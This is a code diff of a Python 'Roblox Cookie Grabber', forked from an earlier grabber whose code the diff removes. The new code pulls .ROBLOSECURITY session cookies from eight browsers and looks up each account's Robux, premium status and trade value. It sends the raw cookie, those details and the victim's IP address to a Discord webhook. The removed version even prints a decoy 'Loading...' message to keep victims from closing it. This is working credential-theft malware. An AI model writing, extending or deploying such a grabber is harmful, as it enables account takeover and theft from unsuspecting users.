@@ -1,49 +1,90 @@
-import os
-import codecs
-import json
-from base64 import *
-
-webhookk = "heh"
-def command(c):
-    os.system(c)
-def cls():
-    os.system("cls")
+webhook = ""
 
 try:
     import robloxpy
-    import requests,re
-    from discordwebhook import *
+    import requests
+    from discordwebhook import * ## I will likely expunge discordwebhook from here in V2.1
     import browser_cookie3
-    
+
 except:
-    input("Libraries not installed press enter to exit...")
+    input("One of the packages are not installed, run 'install.bat' before using this.")
+    exit()
 
 
 
 
-dummy_message = "Loading..." # A message that distracts the user from closing the grabber
-print(dummy_message)
-################### Gathering INFOMATION #################################
+
+def cookiecheckerandsend(cookie, platform):
+
+    ## In the original version, from Mani175, he did not account for the fact there could be multiple cookies, and only accessed the value once.
+    ## In this, it will grab *all* cookies from the platforms that are specified to run this function. Modify them however you see fit.
+
+    if not robloxpy.Utils.CheckCookie(cookie) == "Valid Cookie":
+        return requests.post(url=webhook, data={"content":f"Dead Cookie\n|| ```{cookie}``` ||"})
+
+    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()
+    rid = info["UserID"]
+    username = info['UserName']
+    robux = info['RobuxBalance']
+    premium = info['IsPremium']
+    rap = robloxpy.User.External.GetRAP(rid)
+    friends = robloxpy.User.Friends.External.GetCount(rid)
+    age = robloxpy.User.External.GetAge(rid)
+    crdate = robloxpy.User.External.CreationDate(rid)
+
+    print('Hi')
+    discord = Discord(url=webhook)
+    discord.post(
+    username="ꜱᴏᴍᴇᴛʜɪɴɢ's Roblox Cookie Grabber",
+    avatar_url="https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
+    embeds=[
+        {
+            "title": f"🕯 Valid Account - {platform}",
+            "description" : f"[Github Page](https://github.com/something23-0001/-s-Cookie-Grabber) | [Rolimons](https://www.rolimons.com/player/{rid}) | [Roblox Profile](https://web.roblox.com/users/{rid}/profile)",
+            "color" : 12452044,
+            "fields": [
+                {"name": "Username", "value": username, "inline": True},
+                {"name": "Robux", "value": robux, "inline": True},
+                {"name": "Premium", "value": premium,"inline": True},
+                {"name": "Date of Creation", "value": crdate, "inline": True},
+                {"name": "RAP", "value": rap,"inline": True},
+                {"name": "Friends", "value": friends, "inline": True},
+                {"name": "Age", "value": f"{age} Days ; {int(age)/365:.2f} Years", "inline": True},
+                {"name": "IP Address", "value": requests.get("https://api.ipify.org/").text, "inline:": True},
+                {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
+            ],
+            "footer": {
+                "text": "V2 | Forked from Mani175's Pirate-Cookie-Grabber"
+            }
+        }
+    ],
+)
+
+
 def cookieLogger():
 
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
 
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
+                cookiecheckerandsend(cookie.value, platform='Firefox')
     except:
         pass
+
+    try:
+        cookies = browser_cookie3.safari(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Safari')
+    except:
+        pass
+
     try:
         cookies = browser_cookie3.chromium(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
+                cookiecheckerandsend(cookie.value, platform='Chromium')
     except:
         pass
 
@@ -51,9 +92,15 @@ def cookieLogger():
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
+                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Opera GX')
     except:
         pass
 
@@ -61,9 +108,15 @@ def cookieLogger():
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
+                cookiecheckerandsend(cookie.value, platform='Opera')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.brave(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Brave')
     except:
         pass
 
@@ -71,70 +124,8 @@ def cookieLogger():
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
+                cookiecheckerandsend(cookie.value, platform='Chrome')
     except:
         pass
 
-
 cookies = cookieLogger()
-
-
-#################### INFOMATION #################
-ip_address = requests.get("https://api.ipify.org/").text
-roblox_cookie = cookies[1]
-#################### checking cookie #############
-isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
-if isvalid == "Valid Cookie":
-    pass
-else:
-    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
-    exit()
-
-#################### getting info about the cookie #############
-ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
-info = json.loads(ebruh.text)
-rid = info["UserID"]
-rap = robloxpy.User.External.GetRAP(rid)
-friends = robloxpy.User.Friends.External.GetCount(rid)
-age = robloxpy.User.External.GetAge(rid)
-crdate = robloxpy.User.External.CreationDate(rid)
-rolimons = f"https://www.rolimons.com/player/{rid}"
-roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
-headshot = robloxpy.User.External.GetHeadshot(rid)
-username = info['UserName']
-robux = info['RobuxBalance']
-premium = info['IsPremium'];
-#################### SENDING TO WEBHOOK #################
-
-discord = Discord(url=webhookk)
-discord.post(
-    username="BOT - Pirate 🍪",
-    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
-    embeds=[
-        {
-            "username": "BOT - Pirate 🍪",
-            "title": "💸 +1 Result Account 🕯️",
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
-            "color" : 12452044,
-            "fields": [
-                {"name": "Username", "value": username, "inline": True},
-                {"name": "Robux Balance", "value": robux, "inline": True},
-                {"name": "Premium Status", "value": premium,"inline": True},
-                {"name": "Creation Date", "value": crdate, "inline": True},
-                {"name" : "RAP", "value": rap,"inline": True},
-                {"name" : "Friends", "value": friends, "inline": True},
-                {"name" : "Account Age", "value": age, "inline": True},
-                {"name" : "IP Address", "value" : ip_address, "inline:": True},
-                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
-            ],
-            "thumbnail": {"url": headshot},
-
-
-        }
-    ],
-)
-
-
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
